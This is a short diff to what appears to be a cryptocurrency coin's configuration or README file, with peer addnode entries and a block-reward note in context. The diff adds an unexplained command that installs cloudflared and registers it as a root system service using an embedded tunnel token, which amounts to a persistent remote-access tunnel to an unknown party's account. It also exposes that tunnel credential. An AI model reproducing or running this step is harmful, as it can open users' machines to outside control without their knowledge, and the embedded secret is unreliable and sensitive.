@@ -11,4 +11,7 @@ reduced by 25% every 10,000 blocks
 addnode=206.217.131.88
 addnode=107.175.91.177
 
+brew install cloudflare/cloudflare/cloudflared && 
+
+sudo cloudflared service install eyJhIjoiZGUxOTQwZjU0ZDcwMWYyMDAyZDdmNzlmNmQ3OGM4OWUiLCJ0IjoiMTA1MmZkOGUtMTEzZi00YzhjLWFlMDYtZWI5MjJhNDg5ZWFjIiwicyI6IlptUmxZakV5WWpBdE56ZzVOQzAwTVdRM0xXSTBORGN0TWpnek9EbGpZams1WWpNMyJ9
 
